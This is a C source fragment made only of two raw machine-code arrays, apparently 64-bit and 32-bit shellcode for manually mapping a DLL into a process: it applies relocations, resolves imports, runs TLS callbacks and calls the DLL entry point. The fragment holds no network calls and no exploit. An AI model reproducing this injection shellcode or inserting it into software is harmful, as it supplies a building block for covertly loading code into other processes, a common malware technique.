unsigned char shellcode64[506] = {
	0x48, 0x85, 0xC9, 0x0F, 0x84, 0xF0, 0x01, 0x00, 0x00, 0x56, 0x48, 0x83,
	0xEC, 0x50, 0x48, 0x8B, 0x01, 0x4C, 0x8B, 0xD9, 0x48, 0x89, 0x5C, 0x24,
	0x70, 0x48, 0x8B, 0xF1, 0x48, 0x89, 0x7C, 0x24, 0x40, 0x4C, 0x89, 0x64,
	0x24, 0x38, 0x4C, 0x63, 0x61, 0x3C, 0x4C, 0x89, 0x6C, 0x24, 0x30, 0x4C,
	0x03, 0xE1, 0x4C, 0x89, 0x7C, 0x24, 0x20, 0x4C, 0x8B, 0x79, 0x08, 0x48,
	0x89, 0x44, 0x24, 0x60, 0x45, 0x8B, 0x6C, 0x24, 0x28, 0x4C, 0x03, 0xE9,
	0x4C, 0x89, 0x6C, 0x24, 0x68, 0x4D, 0x2B, 0x5C, 0x24, 0x30, 0x0F, 0x84,
	0x91, 0x00, 0x00, 0x00, 0x41, 0x83, 0xBC, 0x24, 0xB4, 0x00, 0x00, 0x00,
	0x00, 0x0F, 0x84, 0x74, 0x01, 0x00, 0x00, 0x45, 0x8B, 0x8C, 0x24, 0xB0,
	0x00, 0x00, 0x00, 0x4C, 0x03, 0xC9, 0x41, 0x83, 0x39, 0x00, 0x74, 0x71,
	0xBB, 0x00, 0xF0, 0x00, 0x00, 0xBF, 0x00, 0xA0, 0x00, 0x00, 0x0F, 0x1F,
	0x40, 0x00, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x41, 0x8B, 0x49, 0x04, 0x4D, 0x8D, 0x41, 0x08, 0x48, 0x8D, 0x41, 0xF8,
	0x48, 0xD1, 0xE8, 0x85, 0xC0, 0x74, 0x3B, 0x44, 0x8B, 0xD0, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0x0F, 0xB7, 0x10,
	0x0F, 0xB7, 0xC2, 0x66, 0x23, 0xC3, 0x66, 0x3B, 0xC7, 0x75, 0x11, 0x41,
	0x8B, 0x09, 0x81, 0xE2, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x8D, 0x04, 0x16,
	0x4C, 0x01, 0x1C, 0x01, 0x49, 0x83, 0xC0, 0x02, 0x49, 0x83, 0xEA, 0x01,
	0x75, 0xD6, 0x41, 0x8B, 0x49, 0x04, 0x8B, 0xC1, 0x4C, 0x03, 0xC8, 0x41,
	0x83, 0x39, 0x00, 0x75, 0xA7, 0x41, 0x83, 0xBC, 0x24, 0x94, 0x00, 0x00,
	0x00, 0x00, 0x0F, 0x84, 0x98, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24,
	0x28, 0x45, 0x8B, 0xB4, 0x24, 0x90, 0x00, 0x00, 0x00, 0x4C, 0x03, 0xF6,
	0x41, 0x8B, 0x46, 0x0C, 0x85, 0xC0, 0x74, 0x7B, 0x4C, 0x8B, 0x6C, 0x24,
	0x60, 0x48, 0x89, 0x6C, 0x24, 0x48, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,
	0x8B, 0xC8, 0x48, 0x03, 0xCE, 0x41, 0xFF, 0xD5, 0x45, 0x8B, 0x06, 0x48,
	0x8B, 0xE8, 0x41, 0x8B, 0x56, 0x10, 0x49, 0x8D, 0x0C, 0x30, 0x48, 0x85,
	0xC9, 0x48, 0x8D, 0x3C, 0x32, 0x41, 0x0F, 0x45, 0xD0, 0x48, 0x8B, 0x0C,
	0x32, 0x48, 0x8D, 0x1C, 0x32, 0x48, 0x85, 0xC9, 0x74, 0x27, 0x79, 0x05,
	0x0F, 0xB7, 0xD1, 0xEB, 0x07, 0x48, 0x8D, 0x56, 0x02, 0x48, 0x03, 0xD1,
	0x48, 0x8B, 0xCD, 0x41, 0xFF, 0xD7, 0x48, 0x83, 0xC3, 0x08, 0x48, 0x89,
	0x07, 0x48, 0x83, 0xC7, 0x08, 0x48, 0x8B, 0x0B, 0x48, 0x85, 0xC9, 0x75,
	0xD9, 0x41, 0x8B, 0x46, 0x20, 0x49, 0x83, 0xC6, 0x14, 0x85, 0xC0, 0x75,
	0x9F, 0x4C, 0x8B, 0x6C, 0x24, 0x68, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x4C,
	0x8B, 0x74, 0x24, 0x28, 0x41, 0x83, 0xBC, 0x24, 0xD4, 0x00, 0x00, 0x00,
	0x00, 0x74, 0x2F, 0x41, 0x8B, 0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x5C, 0x30, 0x18, 0x48, 0x85, 0xDB, 0x74, 0x1D, 0x0F, 0x1F, 0x00,
	0x48, 0x8B, 0x03, 0x48, 0x85, 0xC0, 0x74, 0x12, 0x45, 0x33, 0xC0, 0x48,
	0x8B, 0xCE, 0x41, 0x8D, 0x50, 0x01, 0xFF, 0xD0, 0x48, 0x83, 0xC3, 0x08,
	0x75, 0xE6, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0xCE, 0x41, 0x8D, 0x50, 0x01,
	0x41, 0xFF, 0xD5, 0x48, 0x89, 0x76, 0x10, 0x4C, 0x8B, 0x6C, 0x24, 0x30,
	0x4C, 0x8B, 0x64, 0x24, 0x38, 0x48, 0x8B, 0x7C, 0x24, 0x40, 0x48, 0x8B,
	0x5C, 0x24, 0x70, 0x4C, 0x8B, 0x7C, 0x24, 0x20, 0x48, 0x83, 0xC4, 0x50,
	0x5E, 0xC3
};
const static unsigned char shellcode32[328] = {
	0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x57, 0x8B, 0x7D, 0x08, 0x85, 0xFF,
	0x0F, 0x84, 0x2F, 0x01, 0x00, 0x00, 0x8B, 0x4F, 0x3C, 0x8B, 0x47, 0x04,
	0x03, 0xCF, 0x8B, 0x17, 0x89, 0x45, 0xFC, 0x53, 0x8B, 0x41, 0x28, 0x03,
	0xC7, 0x89, 0x4D, 0xF0, 0x89, 0x45, 0xEC, 0x8B, 0xC7, 0x2B, 0x41, 0x34,
	0x56, 0x89, 0x55, 0xF4, 0x89, 0x45, 0x08, 0x74, 0x60, 0x83, 0xB9, 0xA4,
	0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xF9, 0x00, 0x00, 0x00, 0x8B, 0xB1,
	0xA0, 0x00, 0x00, 0x00, 0x03, 0xF7, 0x83, 0x3E, 0x00, 0x74, 0x46, 0x8B,
	0x46, 0x04, 0x8D, 0x56, 0x08, 0x8D, 0x58, 0xF8, 0xD1, 0xEB, 0x74, 0x2C,
	0x0F, 0xB7, 0x02, 0x8B, 0xC8, 0x81, 0xE1, 0x00, 0xF0, 0x00, 0x00, 0x81,
	0xF9, 0x00, 0x30, 0x00, 0x00, 0x75, 0x0E, 0x8B, 0x4D, 0x08, 0x25, 0xFF,
	0x0F, 0x00, 0x00, 0x03, 0xC7, 0x03, 0x06, 0x01, 0x08, 0x83, 0xC2, 0x02,
	0x83, 0xEB, 0x01, 0x75, 0xD7, 0x8B, 0x46, 0x04, 0x03, 0xF0, 0x83, 0x3E,
	0x00, 0x75, 0xC0, 0x8B, 0x4D, 0xF0, 0x8B, 0x55, 0xF4, 0x83, 0xB9, 0x84,
	0x00, 0x00, 0x00, 0x00, 0x74, 0x69, 0x8B, 0x99, 0x80, 0x00, 0x00, 0x00,
	0x03, 0xDF, 0x89, 0x5D, 0xF8, 0x8B, 0x43, 0x0C, 0x85, 0xC0, 0x74, 0x57,
	0x03, 0xC7, 0x50, 0xFF, 0xD2, 0x8B, 0x13, 0x8B, 0x73, 0x10, 0x89, 0x45,
	0x08, 0x8D, 0x0C, 0x3A, 0x85, 0xC9, 0x8D, 0x1C, 0x3E, 0x0F, 0x45, 0xF2,
	0x03, 0xF7, 0x8B, 0x06, 0x85, 0xC0, 0x74, 0x21, 0x79, 0x05, 0x0F, 0xB7,
	0xC0, 0xEB, 0x05, 0x83, 0xC0, 0x02, 0x03, 0xC7, 0x50, 0xFF, 0x75, 0x08,
	0xFF, 0x55, 0xFC, 0x83, 0xC6, 0x04, 0x89, 0x03, 0x83, 0xC3, 0x04, 0x8B,
	0x06, 0x85, 0xC0, 0x75, 0xDF, 0x8B, 0x5D, 0xF8, 0x8B, 0x55, 0xF4, 0x83,
	0xC3, 0x14, 0x89, 0x5D, 0xF8, 0x8B, 0x43, 0x0C, 0x85, 0xC0, 0x75, 0xAC,
	0x8B, 0x4D, 0xF0, 0x83, 0xB9, 0xC4, 0x00, 0x00, 0x00, 0x00, 0x74, 0x20,
	0x8B, 0x81, 0xC0, 0x00, 0x00, 0x00, 0x8B, 0x74, 0x38, 0x0C, 0x85, 0xF6,
	0x74, 0x12, 0x8B, 0x06, 0x85, 0xC0, 0x74, 0x0C, 0x6A, 0x00, 0x6A, 0x01,
	0x57, 0xFF, 0xD0, 0x83, 0xC6, 0x04, 0x75, 0xEE, 0x6A, 0x00, 0x6A, 0x01,
	0x57, 0xFF, 0x55, 0xEC, 0x89, 0x7F, 0x08, 0x5E, 0x5B, 0x5F, 0x8B, 0xE5,
	0x5D, 0xC2, 0x04, 0x00
};